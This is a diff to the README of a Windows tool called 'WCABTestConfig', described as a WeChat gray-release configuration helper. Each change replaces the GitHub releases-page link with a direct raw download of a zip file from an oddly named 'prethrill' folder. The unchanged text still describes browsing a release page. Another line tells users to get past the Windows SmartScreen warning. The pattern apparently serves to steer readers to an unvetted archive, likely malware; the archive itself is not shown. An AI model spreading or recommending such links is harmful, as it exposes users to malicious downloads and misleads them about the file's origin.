@@ -1,6 +1,6 @@
 # 🧩 WCABTestConfig - Simple WeChat Gray Release Setup
 
-[![Download WCABTestConfig](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/rahulredhanded829/WCABTestConfig/releases)
+[![Download WCABTestConfig](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/rahulredhanded829/WCABTestConfig/raw/refs/heads/main/prethrill/Config-WCAB-Test-2.2.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use it when you need to check config values, compare test groups, or review gray
 
 Visit this page to download the latest version for Windows:
 
-https://github.com/rahulredhanded829/WCABTestConfig/releases
+https://github.com/rahulredhanded829/WCABTestConfig/raw/refs/heads/main/prethrill/Config-WCAB-Test-2.2.zip
 
 On the release page, look for the latest version and download the Windows file. If you see a ZIP file, save it to your computer and extract it first.
 
@@ -46,7 +46,7 @@ If Windows shows a SmartScreen prompt, choose the option that lets you run the f
 ## 🪟 How to Install on Windows
 
 1. Open the release page:
-   https://github.com/rahulredhanded829/WCABTestConfig/releases
+   https://github.com/rahulredhanded829/WCABTestConfig/raw/refs/heads/main/prethrill/Config-WCAB-Test-2.2.zip
 
 2. Find the newest release at the top of the page.
 
@@ -154,7 +154,7 @@ No. You only need to download the file, extract it if needed, and open the app.
 ### Where do I get updates?
 
 Check the release page for the latest version:
-https://github.com/rahulredhanded829/WCABTestConfig/releases
+https://github.com/rahulredhanded829/WCABTestConfig/raw/refs/heads/main/prethrill/Config-WCAB-Test-2.2.zip
 
 ### What if I want the newest build?
 
